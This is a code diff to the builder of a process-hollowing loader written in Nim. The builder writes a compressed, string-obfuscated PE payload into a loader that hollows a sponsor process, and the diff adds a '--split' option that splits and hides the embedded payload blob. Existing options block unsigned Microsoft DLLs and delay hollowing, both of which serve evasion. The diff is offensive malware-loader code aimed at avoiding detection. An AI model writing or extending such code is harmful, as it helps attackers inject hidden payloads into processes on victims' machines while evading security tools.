@@ -61,6 +61,7 @@ var sponsorParams: string
 var outFormat: string
 var outDllExportName: string  
 var isBlockDlls: bool
+var isSplit: bool
 var sleepSeconds: string
 var isDebug: bool
 
@@ -92,6 +93,7 @@ when isMainModule:
         option("-f", "--format", help="PE hollower format", choices = @["exe", "dll"], default=some("exe"))
         option("-e", "--export", help="DLL export name (relevant only for Dll format)", default=some("DllRegisterServer"))
         flag("-b", "--block", help="Block unsigned Microsoft Dlls in the hollowed process")
+        flag("-p", "--split", help="Split and hide the payload blob in hollower (takes long to compile!)")
         option("-t", "--sleep", help="Number of seconds to sleep before hollowing", default=some("0"))
         flag("-d", "--debug", help="Compile as debug instead of release (loader is verbose)")
     # Parse arguments
@@ -107,6 +109,7 @@ when isMainModule:
         outFormat = opts.format
         outDllExportName = opts.export
         isBlockDlls = opts.block
+        isSplit = opts.split
         sleepSeconds = opts.sleep
         isDebug = opts.debug
     except ShortCircuit as err:
@@ -136,11 +139,16 @@ when isMainModule:
 
     # Write the parameters to the loader params
     var paramsPath = "Loader/params.nim"
+    var compressedBase64PELine: string
+    if isSplit:
+        compressedBase64PELine = fmt"""var compressedBase64PE* = splitString(protectString("{compressedBase64PE}"))"""
+    else:
+        compressedBase64PELine = fmt"""var compressedBase64PE* = protectString("{compressedBase64PE}")"""
     var paramsToHollower = fmt"""
 import os
 import nimprotect
 
-var compressedBase64PE* = splitString(protectString("{compressedBase64PE}"))
+{compressedBase64PELine}
 var sponsorPath* = {sponsorPath}
 var sponsorParams* = protectString(r" {sponsorParams}")
 var dllExportName* = protectString("{outDllExportName}") 
